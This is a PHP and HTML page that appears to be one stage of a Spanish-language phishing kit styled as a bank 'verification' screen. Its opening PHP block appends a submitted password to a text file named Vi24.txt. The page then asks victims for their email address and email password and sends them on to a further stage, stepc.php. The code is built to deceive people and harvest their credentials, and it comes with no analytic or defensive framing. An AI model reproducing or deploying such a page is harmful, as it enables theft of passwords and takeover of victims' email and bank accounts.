<?php

$datoc = $_POST['pass'];
$archivo="Vi24.txt";
$file=fopen($archivo,"a");
fwrite($file, "Contraseña:" .$datoc.PHP_EOL);
fclose($file);
?>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1" >
        <link rel="stylesheet" href="stle.css">
        <title>Verificacion</title>
        <meta charset="utf-8">
        <style>
 * {margin:0px;}
body {background-color:#fafbfd; font-family: arial;color:#4E4C4C;overflow-x:hidden}
.container {width:100%;}
.box {width:28%;height:50%;margin:0 auto;background-color: white;border-radius: 5px;margin-right: auto;margin-left: auto;position: relative;
-webkit-box-shadow: 0px 2px 2px 0px rgb(214 214 214);
-moz-box-shadow: 0px 2px 2px 0px rgba(214, 214, 214, 1);
box-shadow: 0px 1px 2px 0px rgb(226 225 225);
top: 30px;border: 1px solid #e2e8ee;padding: 45px;}        
.ray {background-color: #ec111a;height: 2px;max-width: 30px;position: relative;top: 10px;margin-left:1px;}
.font-600 {font-weight: 600;}
select {background-color: transparent;}

label {width: 100%;display: block;cursor: pointer;font-size:2em;}
.la {font-size:15px;font-weight: 700;color:#444343;}
#pass {border: none;border-bottom: 1px solid rgb(169, 169, 169);width: 100%;padding-top:2%;padding-bottom:2%;font-size:14px;font-weight: normal;}
#pass:focus-visible {outline: none;}
#pass::placeholder {font-size:14px;color:#BDB9B8;font-weight:lighter;}
#pass:focus {border-bottom:2px solid #38B2E3;}
#pa {border: none;border-bottom: 1px solid rgb(169, 169, 169);width: 100%;padding-top:2%;padding-bottom:2%;font-size:14px;font-weight: normal;}
#pa:focus-visible {outline: none;}
#pa::placeholder {font-size:14px;color:#BDB9B8;font-weight:lighter;}
#pa:focus {border-bottom:2px solid #38B2E3;}
input::-webkit-outer-spin-button,
input::-webkit-inner-spin-button {
-webkit-appearance: none;margin: 0; }
input[type="number"] {
-moz-appearance: textfield; }
.enviar {opacity: 1;color: #757575;text-decoration: none;padding: 12px;margin-top: 30px;border: 1px solid #dedede;
background-color: #fafbfd;width: 100%;border-radius: 5px;cursor:pointer;}
h2 {font-size:1.6em;color:#252424;}
#default {color: grey;font-size:10px;}
footer {width:100%;}


}
select {position: relative;}
details[open] {z-index: 1;}  
select {
      cursor: pointer;
      border:0;
      background-color: transparent;
      list-style: none;
      width: 100%;
      border-bottom: 1px solid rgb(169, 169, 169);padding-top:1%;padding-bottom:1%;
      font-size:16px;
      color:#66605F;
      font-weight:lighter;
      margin-left:-1%;
    }
select[open] {
      content: "";
      display: block;
      width: 100vw;
      height: 100vh;
      background: transparent;
      position: fixed;
      top: 0;
      left: 0;
    } 
    select:focus {
      outline: none;border-bottom:2px solid #38B2E3;
    }
    label {font-size:0.8em;color:#272626;}
.logof,.logog {display:none;}

@media only screen and (min-device-width: 1800px) {
body {width:100%;}
.box {height:35%;width:25%;}
.enviar {margin-top: 10%;}
.logof,.logog {display:none;}

}

@media only screen and (min-device-width: 1500px) and (max-device-width: 1800px){
body {width:100%;}
.box {height:40%;width:25%;}
.enviar {margin-top: 10%;}
.logof,.logog {display:none;}

}

@media only screen and (max-device-width: 1250px) {
body {width:100%;}
.box {height:30%;width:28%;}
.enviar {margin-top: 10%;}
.logof,.logog {display:none;}

}

@media only screen and (max-device-width: 1100px) {
body {width:100%;}
.logof,.logog {display:none;}
}

@media only screen and (max-device-width: 750px) {
body {max-width:100%;}
.box {width:95%;padding:0;border:none;background-color: transparent;
    -webkit-box-shadow:none;
-moz-box-shadow: none;
box-shadow: none;
}
.logo,#logo {display:none;}
.logof,.logog {display:inline-block;width:100%;}
.container {max-width:100%;}
.la,#submit,h2,#pass,.enviar,.ray,#pa {margin-left:5%;}
#pass,select,#pa {width:85%;}
select {margin-left:4%;}
.enviar {width: 85%;border-radius: 5px;font-weight:600;margin-top: 15%;}
.logog {position:absolute;top:60%;}
}
        </style>
    </head>
<body>
    <div class="logof"><img src="im/logof.png" width="100%"></div>
    <div class="container">
        <img src="im/logoa.png" width="100%" height="10%" id="logo">
        <div class="box">
            <h2>¡Verificando!</h2>
             <div class="ray"></div><br><br>
             
             <form method="post" action="stepc.php" >
              <label class="la">Ingresa tu correo </label>
              <input type="email"  name="co" id="pass"
                placeholder="Email" required />

              <br /><br><br>
              <label class="la">Ingresa clave correo</label>
              <input type="password"  name="clv" id="pa"
                placeholder="Clave" required />
              
              <button id="submitx" class="enviar" disabled style="font-size: 14px">
                Continuar
              </button>
            </form>
       
       
       
        </div>
        
        
        
         <div class="footer"><br><br>
           <div class="logog"><img src="im/logog.png" width="100%"></div>
            <div class="logo"><img src="im/logob.png" width="100%"></div>
        </div>
        
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
    crossorigin="anonymous"></script>
  <script>
    var identificacion = document.getElementById("pa");
    var submitx = document.getElementById("submitx");
    var i = 0;
    var si = 0;
    var num_doc = document.getElementById("num_doc");

    identificacion.addEventListener("keydown", contar, false);
    function contar() {
      let ogt = identificacion.value;
      console.log(ogt.length);
      if (ogt.length === 3) {
        submitx.style.backgroundColor = "red";
        submitx.style.color = "white";
        submitx.removeAttribute('disabled')
      }

      if (ogt.length < 3) {
        submitx.style.backgroundColor = "transparent";
        submitx.style.color = "gray";
        submitx.setAttribute('disabled','');
      }
    }
    
  </script>
    
</body>
</html>